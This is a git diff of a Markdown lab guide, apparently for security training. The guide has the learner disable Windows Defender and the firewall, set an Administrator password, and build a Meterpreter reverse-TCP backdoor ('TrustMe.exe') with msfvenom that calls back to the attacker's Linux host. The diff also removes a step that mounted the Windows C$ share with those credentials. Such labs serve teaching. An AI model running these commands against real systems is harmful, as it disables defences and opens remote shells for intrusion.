@@ -204,11 +204,16 @@ Next, run the following command in the **Powershell** terminal:
 Set-MpPreference -DisableRealtimeMonitoring $true
 ```
 
-<img width="786" height="223" alt="image" src="https://github.com/user-attachments/assets/def5f9b6-22c7-4278-9b37-fbfb5af3a02e" />
+<img width="820" height="139" alt="2026-03-26_10-20" src="https://github.com/user-attachments/assets/446b50ed-75b5-4e04-a505-559833112aa1" />
+
 
 This will disable **Defender** for this session.
 
 If you get angry red errors, that is **Ok**, it means **Defender** is not running.
+
+Open **Command Prompt**
+
+<img width="74" height="91" alt="Screenshot From 2026-02-07 17-59-56" src="https://github.com/user-attachments/assets/761a7584-f744-4f6a-926b-339891c1d5b4" />
 
 Next, lets ensure the firewall is disabled. In a Windows Command Prompt.
 
@@ -225,62 +230,42 @@ net user Administrator password1234
 
 Please note, that is a very bad password.  Come up with something better. But, please remember it.
 
-Before we move on from our Powershell window, lets get our IP by running the following command:
+Let's continue by opening an **Ubuntu** terminal
 
-```cmd
-ipconfig
-```
+<img width="90" height="104" alt="Screenshot From 2026-02-23 10-28-37" src="https://github.com/user-attachments/assets/dc26dda4-12b8-4f03-8a07-f170e5064f8d" />
 
 
-**REMEMBER - YOUR IP WILL BE DIFFERENT**
 
-Write this IP down so we can use it again later.
-
-Let's continue by opening a **Kali** terminal
-
-<img width="71" height="68" alt="image" src="https://github.com/user-attachments/assets/5f116093-6854-4e55-a231-0c42359dc163" />
-
-Alternatively, you can click on the **Kali** icon in the taskbar.
-
-
-We need to run the following commands in order to mount our remote system to the correct directory:
+Become root:
 
 ```bash
 sudo su -
 ```
 
-```bash
-mount -t cifs //[Your IP Address]/c$ /mnt/windows-share -o username=Administrator,password=password1234
-```
 
-**REMEMBER - YOUR IP ADDRESS AND PASSWORD WILL BE DIFFERENT.**
-
-
-
-Run the following command to navigate into the mounted directory:
-
-```bash
-cd /mnt/windows-share
-```
-
-<img width="645" height="251" alt="image" src="https://github.com/user-attachments/assets/b3a98a1f-559f-46b3-8967-88457212d1ee" />
-
-
-Before we run the next commands, we need to get the IP of our Kali System (AKA our Linux IP Adress). Lets do so by running the following:
+Before we run the next commands, we need to get the **IP** of our **Linux System**. Lets do so by running the following:
 
 ```bash
 ifconfig
 ```
 
-<img width="660" height="419" alt="image" src="https://github.com/user-attachments/assets/d88c93b2-c80f-4a88-ba71-3e82cbcf20a2" />
-
+<img width="716" height="175" alt="Get_IPLinux" src="https://github.com/user-attachments/assets/55ffa0a2-0502-4331-ad4e-720b1c1f4205" />
 
 **REMEMBER: YOUR IP WILL BE DIFFERENT**
 
 Run the following commands to start a simple backdoor and backdoor listener: 
 
 ```bash
-msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp lhost=[Your Linux IP Address] lport=4444 -f exe -o /mnt/windows-share/TrustMe.exe
+cd /tmp/
+```
+
+
+
+Run the following commands to start a simple backdoor and backdoor listener: 
+
+```bash
+
+msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp lhost=[Your Linux IP Address] lport=4444 -f exe > /tmp/TrustMe.exe
 ```
 
 <img width="646" height="148" alt="image" src="https://github.com/user-attachments/assets/d84a0070-9c3f-47cb-b1b4-ea447ddbdeef" />
